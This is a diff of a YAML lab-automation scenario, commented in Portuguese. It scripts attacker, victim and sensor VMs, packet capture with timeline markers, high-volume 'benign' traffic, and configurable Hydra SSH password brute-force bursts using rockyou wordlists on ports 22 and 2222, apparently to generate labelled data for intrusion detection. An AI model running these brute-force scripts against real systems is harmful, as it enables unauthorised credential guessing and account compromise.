@@ -23,6 +23,44 @@ vars:
   repeats_medium: 2
   think_min_ms: 300
   think_max_ms: 1200
+  hydra_bursts: 18                         # 0 => usa 1 ciclo completo; >0 => número total de rajadas
+  hydra_burst_ports_cycle: "22,2222"       # ciclo de portas a repetir por rajada
+  hydra_burst_sleep_min_s: 8               # sleep mínimo antes de cada rajada (seg)
+  hydra_burst_sleep_max_s: 8               # sleep máximo antes de cada rajada (seg)
+  hydra_burst_timeout_s: 300
+  hydra_burst_users_per: 200
+  hydra_burst_pwds_per: 200
+  hydra_burst_jitter_min_ms: 200
+  hydra_burst_jitter_max_ms: 900
+  benign1_scale: 8                # fator multiplicador global
+  benign1_parallel: 8
+  benign1_reqs_http: 40
+  benign1_reqs_echo: 40
+  benign1_ping_count: 30
+  benign1_ssh_conn: 30
+  benign1_iperf_sess: 8
+  benign1_splay_max_ms: 80
+  benign1_http_timeout_s: 3
+  benign1_echo_timeout_s: 3
+  benign1_ssh_timeout_s: 3
+  benign1_iperf_timeout_s: 2
+  benign2_scale: 10
+  benign2_parallel: 6
+  benign2_dns_repeats: 10
+  benign2_https_repeats: 8
+  benign2_dns_timeout_s: 3
+  benign2_https_timeout_s: 6
+  benign2_jitter_min_ms: 250
+  benign2_jitter_max_ms: 1200
+  benign3_scale: 9
+  benign3_parallel: 5
+  benign3_ssh_repeats: 6
+  benign3_scp_repeats: 4
+  benign3_ssh_timeout_s: 8
+  benign3_scp_timeout_s: 10
+  benign3_jitter_min_ms: 300
+  benign3_jitter_max_ms: 1500
+
 
 # Usado pelo parser para rotação caso você acione o step interno de captura avançada
 capture:
@@ -77,82 +115,6 @@ steps:
       rm -f "{hydra_dir}/*.restore" 2>/dev/null || true
       rm -f "{cap_dir}/timeline" 2>/dev/null || true
       rm -f "{cap_dir}/manifest"* 2>/dev/null || true
-        
-  - id: attacker_prepare_wordlists
-    title: "Atacante | Preparar wordlists (higienizadas)"
-    description: "Garante rockyou descompactado e cria listas sem linhas vazias/comentários."
-    host: attacker
-    tags: ["attacker","prep","credential_access"]
-    eta: "<5s"
-    timeout: 100
-    artifacts:
-      - "{hydra_dir}/users.clean.txt"
-      - "{hydra_dir}/rockyou.clean.txt"
-    script: |
-      set -Eeuo pipefail
-      mkdir -p "{hydra_dir}"
-      chown -R vagrant:vagrant "{hydra_dir}" || true
-
-      # rockyou.txt (descompacta se necessário)
-      if [ -f "{pass_list}.gz" ] && [ ! -f "{pass_list}" ]; then
-        gzip -dk "{pass_list}.gz" || true
-      fi
-
-      # users.clean.txt (apenas tokens válidos)
-      grep -E '^[[:alnum:]_.-]+$' "{user_list}" | sed 's/\r$//' > "{hydra_dir}/users.clean.txt"
-
-      # rockyou.clean.txt (remove linhas em branco)
-      if [ -f "{pass_list}" ]; then
-        grep -v '^[[:space:]]*$' "{pass_list}" | sed 's/\r$//' > "{hydra_dir}/rockyou.clean.txt"
-      else
-        printf "vagrant\nadmin\npassword\n123456\n" > "{hydra_dir}/rockyou.clean.txt"
-      fi
-
-      # NOVO: fatias menores para balancear benignos/ataque
-      head -n "{hydra_users_max}" "{hydra_dir}/users.clean.txt"   > "{hydra_dir}/users.slice.txt"
-      head -n "{hydra_pwds_max}"  "{hydra_dir}/rockyou.clean.txt" > "{hydra_dir}/rockyou.slice.txt"
-
-  - id: attacker_install_benign_deps
-    title: "Attacker - Instalar dependências para tráfego benigno"
-    description: "Instala utilitários necessários para gerar conexões curtas paralelas (curl, nc, iperf3, sshpass)."
-    host: attacker
-    tags: [ "attacker", "benign", "deps", "setup" ]
-    eta: "30s"
-    timeout: 300
-    artifacts: []
-    script: |
-      set -Eeuo pipefail
-      echo "[attacker] Instalando dependências..."
-      if command -v apt-get >/dev/null 2>&1; then
-        sudo apt-get update -y
-        sudo apt-get install -y curl netcat-openbsd iperf3 sshpass >/dev/null 2>&1 || true
-      elif command -v dnf >/dev/null 2>&1; then
-        sudo dnf install -y curl nmap-ncat iperf3 sshpass >/dev/null 2>&1 || true
-      else
-        echo "[attacker] Gerenciador de pacotes não identificado; assumindo já instalado."
-      fi
-      echo "[attacker] Dependências OK."
-
-  - id: attacker_install_extra_deps
-    title: "Attacker - Dependências extras (DNS/SSH client)"
-    description: "Instala dnsutils/bind-utils e openssh-client/openssh-clients."
-    host: attacker
-    tags: [ "attacker", "benign", "deps", "setup" ]
-    eta: "<15s"
-    timeout: 180
-    artifacts: []
-    script: |
-      set -Eeuo pipefail
-      echo "[attacker] Instalando deps extras..."
-      if command -v apt-get >/dev/null 2>&1; then
-        sudo apt-get update -y
-        sudo apt-get install -y dnsutils openssh-client >/dev/null 2>&1 || true
-      elif command -v dnf >/dev/null 2>&1; then
-        sudo dnf install -y bind-utils openssh-clients >/dev/null 2>&1 || true
-      else
-        echo "[attacker] Gerenciador de pacotes não identificado; assumindo já instalado."
-      fi
-      echo "[attacker] Deps extras OK."
 
   - id: sensor_capture_start
     title: "Sensor | Iniciar captura (iface correta)"
@@ -307,45 +269,45 @@ steps:
     description: "Gera muitas conexões curtas (HTTP sem keep-alive, Echo TCP, ICMP, SSH curtos, iperf3) e grava marcadores benign1_* no timeline."
     host: attacker
     tags: [ "benign", "http", "echo", "icmp", "ssh", "iperf3", "pre-attack" ]
-    eta: "90s"
-    timeout: 200
+    eta: "dinâmico"
+    timeout: 1000
     artifacts:
       - "{cap_dir}/timeline"
     script: |
       set -Eeuo pipefail
       set -x
-      
-      # Teste para conexão na 9090 -> timeout 5 bash -c 'echo "teste" > /dev/tcp/192.168.56.12/9090 && echo "Conectado e enviado"'
-      
+
       echo "[attacker] Fase BENIGNA 1 (pré-ataque)"
       VICTIM_HOST="${VICTIM_HOST:-victim}"
       VICTIM_IP="$(getent hosts "${VICTIM_HOST}" | awk '{print $1}' || true)"
       VICTIM_IP="${VICTIM_IP:-192.168.56.12}"
-      
+
       CAP_DIR="/vagrant/data/captures"
       mkdir -p "${CAP_DIR}" || true
-      
+
       # timeline: marca início uma vez
       printf 'benign1_start=%s\n' "$(date +%s)" | tee -a "${CAP_DIR}/timeline" >/dev/null || true
       trap 'printf "benign1_end=%s\n" "$(date +%s)" | tee -a "${CAP_DIR}/timeline" >/dev/null || true' EXIT
-      
-      # ---------- CONFIG (valores que você pediu) ----------
+
+      # ---------- CONFIG parametrizada via vars ----------
       HTTP_PORT=8080
       ECHO_PORT=9090
-      PARALLEL=8
-      REQS_HTTP=40
-      REQS_ECHO=40
-      PING_COUNT=30
-      SSH_CONN=30
-      IPERF_SESS=8
-      SPLAY_MAX=80  # ms
-      
-      # adaptive timeouts (reduzidos)
-      HTTP_TIMEOUT=3   # usado em curl --max-time
-      ECHO_TIMEOUT=3   # usado em timeout para nc
-      SSH_TIMEOUT=3    # usado em timeout para ssh
-      IPERF_TIMEOUT=2  # timeout para iperf3
-      
+      PARALLEL="{benign1_parallel}"
+
+      SCALE="{benign1_scale}"
+      REQS_HTTP=$(( {benign1_reqs_http} * SCALE ))
+      REQS_ECHO=$(( {benign1_reqs_echo} * SCALE ))
+      PING_COUNT=$(( {benign1_ping_count} * SCALE ))
+      SSH_CONN=$(( {benign1_ssh_conn} * SCALE ))
+      IPERF_SESS=$(( {benign1_iperf_sess} * SCALE ))
+
+      SPLAY_MAX="{benign1_splay_max_ms}"
+
+      HTTP_TIMEOUT="{benign1_http_timeout_s}"
+      ECHO_TIMEOUT="{benign1_echo_timeout_s}"
+      SSH_TIMEOUT="{benign1_ssh_timeout_s}"
+      IPERF_TIMEOUT="{benign1_iperf_timeout_s}"
+
       # ---------- utilidades seguras ----------
       msleep() {
         local ms="${1:-0}"
@@ -358,7 +320,7 @@ steps:
         sleep "0.$(printf '%03d' "${ms}")" >/dev/null 2>&1 || true
         return 0
       }
-      
+
       unset -f rand_path 2>/dev/null || true
       rand_path() {
         local len=$((8 + RANDOM % 8))
@@ -369,10 +331,9 @@ steps:
         done
         printf '%s' "$out"
       }
-      
+
       log(){ echo "[attacker.benign1] $*"; }
-      
-      # Sonda de porta TCP (não bloqueia esperando dados)
+
       wait_port() {
         local host="$1" port="$2" tries="${3:-12}" delay="${4:-0.5}" to="${5:-2}"
         for i in $(seq 1 "$tries"); do
@@ -389,25 +350,24 @@ steps:
         done
         return 1
       }
-      
-      # ---------- workload functions (todos tolerantes a erros) ----------
+
       do_http(){
         curl -fsS --max-time "${HTTP_TIMEOUT}" --http1.1 --no-keepalive \
           "http://${VICTIM_IP}:${HTTP_PORT}/$(rand_path)" >/dev/null 2>&1 || :
         msleep "$((RANDOM % SPLAY_MAX))" || :
       }
-      
+
       do_echo(){
         { echo "hello $(rand_path)"; echo "t $(date +%s)"; } \
           | timeout "${ECHO_TIMEOUT}" nc "${VICTIM_IP}" "${ECHO_PORT}" >/dev/null 2>&1 || :
         msleep "$((RANDOM % SPLAY_MAX))" || :
       }
-      
+
       do_ping(){
         ping -c1 -W1 "${VICTIM_IP}" >/dev/null 2>&1 || :
         msleep "$((RANDOM % SPLAY_MAX))" || :
       }
-      
+
       do_ssh(){
         if command -v sshpass >/dev/null 2>&1; then
           timeout "${SSH_TIMEOUT}" sshpass -p "${SSH_PASS:-vagrant}" ssh \
@@ -419,15 +379,14 @@ steps:
         fi
         msleep "$((RANDOM % SPLAY_MAX))" || :
       }
-      
+
       do_iperf(){
         if command -v iperf3 >/dev/null 2>&1; then
           timeout "${IPERF_TIMEOUT}" iperf3 -c "${VICTIM_IP}" -t 1 >/dev/null 2>&1 || :
         fi
         msleep "$((RANDOM % SPLAY_MAX))" || :
       }
-      
-      # Executor concorrente sem xargs
+
       run_many(){
         local count="$1" func="$2"
         local running=0 i
@@ -443,52 +402,47 @@ steps:
         done
         wait || true
       }
-      
-      # ---- pré-checagem/health-check (substitui o bloco antigo) ----
-      # HTTP warm-up (HEAD)
+
+      # Health-checks
       if curl -s -o /dev/null -I --max-time 2 "http://${VICTIM_IP}:${HTTP_PORT}/"; then
         log "HTTP ${VICTIM_IP}:${HTTP_PORT} OK (HEAD)."
       else
         log "aviso: HTTP possivelmente indisponível em ${VICTIM_IP}:${HTTP_PORT} (HEAD falhou)."
       fi
-      
-      # ECHO warm-up (escreve 1 byte; não bloqueia)
+
       if timeout 2 bash -c "echo -n X > /dev/tcp/${VICTIM_IP}/${ECHO_PORT}" 2>/dev/null; then
         log "ECHO ${VICTIM_IP}:${ECHO_PORT} OK (warm-up)."
       else
         log "ECHO warm-up falhou, aguardando porta abrir…"
       fi
-      
-      # Aguarda porta ECHO ficar acessível (retries)
+
       if wait_port "${VICTIM_IP}" "${ECHO_PORT}" 12 0.5 2; then
         log "ECHO ${VICTIM_IP}:${ECHO_PORT} pronto."
       else
         log "aviso: ECHO TCP possivelmente fechado em ${VICTIM_IP}:${ECHO_PORT} após tentativas."
       fi
-      
-      # --- desarma o set -e/pipefail durante a fase concorrente (tolerância) ---
+
       set +e
       set +o pipefail
-      
+
       run_many "${REQS_HTTP}"  do_http
       run_many "${REQS_ECHO}"  do_echo
       run_many "${PING_COUNT}" do_ping
       run_many "${SSH_CONN}"   do_ssh
       run_many "${IPERF_SESS}" do_iperf
-      
-      # --- reativa robustez para finalizar ---
+
       set -e
       set -o pipefail
-      
+
       echo "[attacker] Benign 1 concluído."
 
   - id: attacker_hydra_run_bursts_22_2222
     title: "Atacante | Executar Hydra em rajadas temporais (22 e 2222)"
-    description: "6 rajadas cronometradas com jitter, alternando portas 22/2222 e marcando janelas no timeline."
+    description: "Rajadas cronometradas com jitter e ciclo de portas configurável."
     host: attacker
-    tags: ["attacker","credential_access","MITRE:T1110","attack","hydra"]
-    timeout: 7200
-    eta: "≈2 hrs"
+    tags: [ "attacker","credential_access","MITRE:T1110","attack","hydra" ]
+    timeout: 12000
+    eta: "dinâmico"
     artifacts:
       - "{hydra_dir}/hydra_${TS}.log"
       - "{cap_dir}/timeline"
@@ -497,89 +451,80 @@ steps:
       CAP_DIR="{cap_dir}"
       HYD_DIR="{hydra_dir}"
       mkdir -p "$CAP_DIR" "$HYD_DIR"
-  
-      # jitter em ms (curto) para evitar bordas muito rígidas
+
+      USERS_N="{hydra_burst_users_per}"
+      PWDS_N="{hydra_burst_pwds_per}"
+      TMO="{hydra_burst_timeout_s}"
+
       jitter_ms() {
-        local min=200 max=900
-        local r
-        if command -v od >/dev/null 2>&1; then
-          r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"
-        else
-          r="$RANDOM"
-        fi
-        local span=$((max-min+1))
-        local ms=$(( (r % span) + min ))
-        local s=$(( ms / 1000 ))
-        local rem=$(( ms % 1000 ))
+        local min="{hydra_burst_jitter_min_ms}" max="{hydra_burst_jitter_max_ms}" r span ms s rem
+        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
+        span=$((max-min+1)); ms=$(( (r % span) + min ))
+        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
         sleep "${s}.$(printf '%03d' "$rem")"
       }
-  
-      # cria subconjuntos pequenos para cada rajada (garante tentativas suficientes)
-      make_subset() {
-        local src="$1" n="$2" dst="$3"
-        if command -v shuf >/dev/null 2>&1; then
-          shuf -n "$n" "$src" > "$dst"
+
+      sleep_between() {
+        local min="{hydra_burst_sleep_min_s}" max="{hydra_burst_sleep_max_s}"
+        if [ -z "$min" ] || [ -z "$max" ]; then return 0; fi
+        if [ "$min" -eq "$max" ] 2>/dev/null; then
+          sleep "$min"
         else
-          head -n "$n" "$src" > "$dst"
+          local r span val
+          if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
+          span=$((max-min+1)); val=$(( (r % span) + min ))
+          sleep "$val"
         fi
       }
-  
+
+      make_subset() {
+        local src="$1" n="$2" dst="$3"
+        if command -v shuf >/dev/null 2>&1; then shuf -n "$n" "$src" > "$dst"; else head -n "$n" "$src" > "$dst"; fi
+      }
+
       run_burst() {
-        local idx="$1" port="$2"
+        local idx="$1" port="$2" timeout_s="$3"
         local ts_now name ufile pfile logf
         ts_now="$(date +%s)"
         name="hydra_burst${idx}_p${port}"
         ufile="${HYD_DIR}/users.b${idx}.txt"
         pfile="${HYD_DIR}/pwds.b${idx}.txt"
         logf="${HYD_DIR}/hydra_$(date +%Y%m%d_%H%M%S)_b${idx}_p${port}.log"
-  
-        # subconjuntos (≈9 combinações por rajada)
-        make_subset "{hydra_dir}/users.slice.txt" 3 "$ufile"
-        make_subset "{hydra_dir}/rockyou.slice.txt" 3 "$pfile"
-  
+
+        make_subset "{hydra_dir}/users.slice.txt"  "$USERS_N" "$ufile"
+        make_subset "{hydra_dir}/rockyou.slice.txt" "$PWDS_N"  "$pfile"
+
         printf '%s_start=%s\n' "$name" "$ts_now" | tee -a "$CAP_DIR/timeline" >/dev/null || true
-  
-        # Executa Hydra por janela curta; alterna -s somente quando != 22
+
         if [ "$port" = "22" ]; then
-          timeout 12 hydra -I -V -t {hydra_threads} \
-            -L "$ufile" -P "$pfile" \
-            -o "$logf" \
-            {victim_ip} {hydra_service} || true
+          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
         else
-          timeout 12 hydra -I -V -t {hydra_threads} \
-            -s "$port" \
-            -L "$ufile" -P "$pfile" \
-            -o "$logf" \
-            {victim_ip} {hydra_service} || true
+          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -s "$port" -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
         fi
-  
-        printf '%s_end=%s\n'   "$name" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
+
+        printf '%s_end=%s\n' "$name" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
       }
-  
-      echo "[hydra] Rajadas temporais iniciando (meta: ≥30 eventos em 5–8 janelas)…"
-  
-      # Agenda: inícios em ~2,8,16,24,32,40s (com jitter curto)
-      SLEEPS=(2 6 8 8 8 8)
-      # Alterna portas: 22,2222,22,2222,22,2222
-      PORT_SEQ=(22 2222 22 2222 22 2222)
-  
-      # Marca um marcador geral (opcional)
+
+      IFS=',' read -r -a CYCLE <<< "{hydra_burst_ports_cycle}"
+      cycle_n=${#CYCLE[@]}
+      if (( cycle_n == 0 )); then echo "[hydra] Ciclo de portas vazio."; exit 0; fi
+
+      n_cfg="{hydra_bursts}"
+      if [[ -z "$n_cfg" || "$n_cfg" = "0" ]]; then N="$cycle_n"; else N="$n_cfg"; fi
+
+      echo "[hydra] Iniciando $N rajada(s) com ciclo de portas: {hydra_burst_ports_cycle}"
       printf 'hydra_multi_start=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
-  
-      for i in $(seq 1 6); do
-        s="${SLEEPS[$((i-1))]}"
-        sleep "$s"; jitter_ms
-        port="${PORT_SEQ[$((i-1))]}"
-        echo "[hydra] Rajada $i/6 na porta $port…"
-        run_burst "$i" "$port"
-        # pequena pausa/jitter entre rajadas
+
+      for ((i=0;i<N;i++)); do
+        sleep_between; jitter_ms
+        port="${CYCLE[$(( i % cycle_n ))]}"
+        echo "[hydra] Rajada $((i+1))/$N na porta $port…"
+        run_burst "$((i+1))" "$port" "$TMO"
         jitter_ms
       done
-  
-      printf 'hydra_multi_end=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
-  
-      echo "[hydra] Rajadas concluídas. Verifique '$CAP_DIR/timeline' para janelas hydra_burst*_start/end."
 
+      printf 'hydra_multi_end=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
+      echo "[hydra] Rajadas concluídas."
   - id: victim_disable_sshd_2222
     title: "Victim - Garantir porta 2222 fechada (sem serviço)"
     description: "Remove config de sshd em 2222, fecha firewall e reinicia o serviço."
@@ -611,12 +556,12 @@ steps:
       fi
 
   - id: attacker_hydra_run_bursts
-    title: "Atacante | Hydra em 3 rajadas t=2/8/16 (inclui 2222 sem serviço)"
-    description: "3 rajadas com jitter; ≥36 eventos por rajada (6x6); última na 2222 (fechada)."
+    title: "Atacante | Hydra em rajadas temporais (configuráveis)"
+    description: "Rajadas com jitter; ciclo de portas e intervalo de sleep por variáveis."
     host: attacker
     tags: [ "attacker","credential_access","MITRE:T1110","attack","hydra" ]
-    timeout: 300
-    eta: "≈1 min"
+    timeout: 12000
+    eta: "dinâmico"
     artifacts:
       - "{hydra_dir}/hydra_${TS}.log"
       - "{cap_dir}/timeline"
@@ -626,25 +571,34 @@ steps:
       HYD_DIR="{hydra_dir}"
       mkdir -p "$CAP_DIR" "$HYD_DIR"
 
+      USERS_N="{hydra_burst_users_per}"
+      PWDS_N="{hydra_burst_pwds_per}"
+      TMO="{hydra_burst_timeout_s}"
+
       jitter_ms() {
-        local min=200 max=900 r span ms s rem
-        if command -v od >/dev/null 2>&1; then
-          r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"
-        else
-          r="$RANDOM"
-        fi
+        local min="{hydra_burst_jitter_min_ms}" max="{hydra_burst_jitter_max_ms}" r span ms s rem
+        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
         span=$((max-min+1)); ms=$(( (r % span) + min ))
         s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
         sleep "${s}.$(printf '%03d' "$rem")"
       }
 
+      sleep_between() {
+        local min="{hydra_burst_sleep_min_s}" max="{hydra_burst_sleep_max_s}"
+        if [ -z "$min" ] || [ -z "$max" ]; then return 0; fi
+        if [ "$min" -eq "$max" ] 2>/dev/null; then
+          sleep "$min"
+        else
+          local r span val
+          if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
+          span=$((max-min+1)); val=$(( (r % span) + min ))
+          sleep "$val"
+        fi
+      }
+
       make_subset() {
         local src="$1" n="$2" dst="$3"
-        if command -v shuf >/dev/null 2>&1; then
-          shuf -n "$n" "$src" > "$dst"
-        else
-          head -n "$n" "$src" > "$dst"
-        fi
+        if command -v shuf >/dev/null 2>&1; then shuf -n "$n" "$src" > "$dst"; else head -n "$n" "$src" > "$dst"; fi
       }
 
       run_burst() {
@@ -656,77 +610,48 @@ steps:
         pfile="${HYD_DIR}/pwds.b${idx}.txt"
         logf="${HYD_DIR}/hydra_$(date +%Y%m%d_%H%M%S)_b${idx}_p${port}.log"
 
-        # 36 combinações por rajada (6x6) ⇒ ≥ 108 eventos no total
-        make_subset "{hydra_dir}/users.slice.txt" 6 "$ufile"
-        make_subset "{hydra_dir}/rockyou.slice.txt" 6 "$pfile"
+        make_subset "{hydra_dir}/users.slice.txt"  "$USERS_N" "$ufile"
+        make_subset "{hydra_dir}/rockyou.slice.txt" "$PWDS_N"  "$pfile"
 
         printf '%s_start=%s\n' "$name" "$ts_now" | tee -a "$CAP_DIR/timeline" >/dev/null || true
 
         if [ "$port" = "22" ]; then
-          timeout "$timeout_s" hydra -I -V -t {hydra_threads} \
-            -L "$ufile" -P "$pfile" \
-            -o "$logf" \
-            {victim_ip} {hydra_service} || true
+          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
         else
-          timeout "$timeout_s" hydra -I -V -t {hydra_threads} \
-            -s "$port" \
-            -L "$ufile" -P "$pfile" \
-            -o "$logf" \
-            {victim_ip} {hydra_service} || true
+          timeout "$timeout_s" hydra -I -V -t {hydra_threads} -s "$port" -L "$ufile" -P "$pfile" -o "$logf" {victim_ip} {hydra_service} || true
         fi
 
         printf '%s_end=%s\n' "$name" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
       }
 
-      echo "[hydra] Rajadas t=2/8/16 com jitter; última em 2222 (sem serviço)…"
+      IFS=',' read -r -a CYCLE <<< "{hydra_burst_ports_cycle}"
+      cycle_n=${#CYCLE[@]}
+      if (( cycle_n == 0 )); then echo "[hydra] Ciclo de portas vazio."; exit 0; fi
+
+      n_cfg="{hydra_bursts}"
+      if [[ -z "$n_cfg" || "$n_cfg" = "0" ]]; then N="$cycle_n"; else N="$n_cfg"; fi
+
+      echo "[hydra] Iniciando $N rajada(s) com ciclo de portas: {hydra_burst_ports_cycle}"
       printf 'hydra_multi_start=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
 
-      BURST_TIMEOUT=15
-      SLEEPS=(2 6 8)          # ⇒ inícios ≈ 2, 8, 16
-      PORT_SEQ=(22 22 2222)   # última em 2222 (fechada)
-
-      for i in 1 2 3; do
-        sleep "${SLEEPS[$((i-1))]}"; jitter_ms
-        port="${PORT_SEQ[$((i-1))]}"
-        echo "[hydra] Rajada $i/3 na porta $port…"
-        run_burst "$i" "$port" "$BURST_TIMEOUT"
+      for ((i=0;i<N;i++)); do
+        sleep_between; jitter_ms
+        port="${CYCLE[$(( i % cycle_n ))]}"
+        echo "[hydra] Rajada $((i+1))/$N na porta $port…"
+        run_burst "$((i+1))" "$port" "$TMO"
         jitter_ms
       done
 
       printf 'hydra_multi_end=%s\n' "$(date +%s)" >> "$CAP_DIR/timeline" || true
-      echo "[hydra] Concluído. Verifique '$CAP_DIR/timeline'."
-#  - id: attacker_hydra_run
-#    title: "Atacante | Executar Hydra"
-#    description: "Brute force contra SSH da vítima com listas higienizadas."
-#    host: attacker
-#    tags: ["attacker","credential_access","MITRE:T1110"]
-#    timeout: 300
-#    eta: "varia"
-#    artifacts:
-#      - "{hydra_dir}/hydra_${TS}.log"
-#    script: |
-#      set -Eeuo pipefail
-#      TS=$(date +%Y%m%d_%H%M%S)
-#      mkdir -p "{hydra_dir}" "{cap_dir}"
-#      chown -R vagrant:vagrant "{hydra_dir}" "{cap_dir}" || true
-#      mkdir -p "{hydra_dir}"
-#      echo "[hydra] alvo={victim_ip} servico={hydra_service} users=users.slice.txt pass=rockyou.slice.txt t={hydra_threads}"
-#      printf 'hydra_start=%s\n' "$(date +%s)" >> "{cap_dir}/timeline" || { echo "[err] não consegui criar timeline hydra_start"; exit 1; }
-#      hydra -I -V -t {hydra_threads} \
-#        -L "{hydra_dir}/users.slice.txt" \
-#        -P "{hydra_dir}/rockyou.slice.txt" \
-#        -o "{hydra_dir}/hydra_${TS}.log" \
-#        {victim_ip} {hydra_service} || true
-#      printf 'hydra_end=%s\n' "$(date +%s)" >> "{cap_dir}/timeline" || { echo "[err] não consegui criar timeline hydra_end"; exit 1; }
-#      echo "$TS" > "{hydra_dir}/.last_ts"
+      echo "[hydra] Concluído."
 
   - id: attacker_benign_dns_https
     title: "Attacker - DNS básico e navegação HTTPS curta"
     description: "Resolve A de domínios e faz GET HTTPS curtos, com jitter e marcação no timeline."
     host: attacker
     tags: [ "attacker","benign","dns","https","pre-attack" ]
-    eta: "30-60s"
-    timeout: 180
+    eta: "dinâmico"
+    timeout: 7200
     artifacts:
       - "{cap_dir}/timeline"
     script: |
@@ -736,50 +661,77 @@ steps:
       printf 'dnshttps_start=%s\n' "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
       trap 'printf "dnshttps_end=%s\n" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true' EXIT
 
-      jitter() {
-        local min_ms="{think_min_ms}" max_ms="{think_max_ms}"
-        local range=$((max_ms - min_ms + 1))
-      
-        # número aleatório robusto (fallback para $RANDOM)
-        local r
-        if command -v od >/dev/null 2>&1; then
-          r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"
-        else
-          r="$RANDOM"
-        fi
-      
-        local ms=$(( (r % range) + min_ms ))
-        local s=$(( ms / 1000 ))
-        local rem=$(( ms % 1000 ))
+      # ---------- CONFIG parametrizada via vars ----------
+      PARALLEL="{benign2_parallel}"
+      SCALE="{benign2_scale}"
+      DNS_N=$(( {benign2_dns_repeats}   * SCALE ))
+      HTTPS_N=$(( {benign2_https_repeats} * SCALE ))
+      DNS_TMO="{benign2_dns_timeout_s}"
+      HTTPS_TMO="{benign2_https_timeout_s}"
+
+      # listas vindas de vars
+      read -r -a DNS_ARR <<< "{dns_names}"
+      read -r -a URL_ARR <<< "{https_urls}"
+
+      jitter_ms() {
+        local min="{benign2_jitter_min_ms}" max="{benign2_jitter_max_ms}" r span ms s rem
+        if command -v od >/dev/null 2>&1; then r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"; else r="$RANDOM"; fi
+        span=$((max-min+1)); ms=$(( (r % span) + min ))
+        s=$(( ms / 1000 )); rem=$(( ms % 1000 ))
         sleep "${s}.$(printf '%03d' "$rem")"
       }
-  
-      # DNS
-      for name in {dns_names}; do
-      echo "[DNS] A $name"
-      dig +retry=1 +time=2 "$name" A >/dev/null 2>&1 || getent hosts "$name" >/dev/null 2>&1 || true
-      jitter
-      done
-      
-      # HTTPS
-      for url in {https_urls}; do
-      echo "[HTTPS] GET $url"
-      curl -m 6 -sSL "$url" >/dev/null 2>&1 || true
-      jitter
-      done
+
+      run_many(){
+        local count="$1" func="$2"
+        local running=0 i
+        for ((i=1; i<=count; i++)); do
+          "$func" &
+          ((running++))
+          if (( running >= PARALLEL )); then
+            if ! wait -n 2>/dev/null; then
+              for p in $(jobs -p); do wait "$p" && break || true; done
+            fi
+            ((running--))
+          fi
+        done
+        wait || true
+      }
+
+      do_dns(){
+        if ((${#DNS_ARR[@]}==0)); then return 0; fi
+        local idx=$(( RANDOM % ${#DNS_ARR[@]} ))
+        local name="${DNS_ARR[$idx]}"
+        # tenta dig; fallback para getent
+        timeout "$DNS_TMO" dig +retry=1 +time="$DNS_TMO" "$name" A >/dev/null 2>&1 \
+          || timeout "$DNS_TMO" getent hosts "$name" >/dev/null 2>&1 || true
+        jitter_ms
+      }
+
+      do_https(){
+        if ((${#URL_ARR[@]}==0)); then return 0; fi
+        local idx=$(( RANDOM % ${#URL_ARR[@]} ))
+        local url="${URL_ARR[$idx]}"
+        curl -m "$HTTPS_TMO" -sSL "$url" >/dev/null 2>&1 || true
+        jitter_ms
+      }
+
+      # Execução em paralelo conforme parâmetros
+      run_many "$DNS_N"   do_dns
+      run_many "$HTTPS_N" do_https
 
   - id: attacker_benign_ssh_scp
     title: "Attacker - SSH legítimo + SCP pequeno"
-    description: "Executa logins SSH reais com chave e transfere arquivo pequeno via SCP (benigno)."
+    description: "Executa logins SSH reais com chave e transfere arquivo pequeno via SCP (benigno), parametrizados via vars e com paralelismo."
     host: attacker
     tags: [ "attacker","benign","ssh","scp","post-attack" ]
-    eta: "30-90s"
-    timeout: 240
+    eta: "dinâmico"
+    timeout: 7200
     artifacts:
       - "{cap_dir}/timeline"
       - "{scp_src_file}"
     script: |
       set -Eeuo pipefail
+
       VICTIM_HOST="${VICTIM_HOST:-victim}"
       VICTIM_IP="$(getent hosts "${VICTIM_HOST}" | awk '{print $1}' || true)"
       VICTIM_IP="${VICTIM_IP:-{victim_ip}}"
@@ -789,44 +741,60 @@ steps:
       printf 'sshscp_start=%s\n' "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true
       trap 'printf "sshscp_end=%s\n" "$(date +%s)" | tee -a "$CAP_DIR/timeline" >/dev/null || true' EXIT
 
-      jitter() {
-        local min_ms="{think_min_ms}" max_ms="{think_max_ms}"
-        local range=$((max_ms - min_ms + 1))
-      
-        # número aleatório robusto (fallback para $RANDOM)
-        local r
-        if command -v od >/dev/null 2>&1; then
-          r="$(od -An -N2 -tu2 < /dev/urandom | tr -d ' ')"
-        else
-          r="$RANDOM"
-        fi
-      
-        local ms=$(( (r % range) + min_ms ))
-        local s=$(( ms / 1000 ))
-        local rem=$(( ms % 1000 ))
+      # ---------- CONFIG via vars ----------
+      PARALLEL="{benign3_parallel}"
+      SCALE="{benign3_scale}"
+
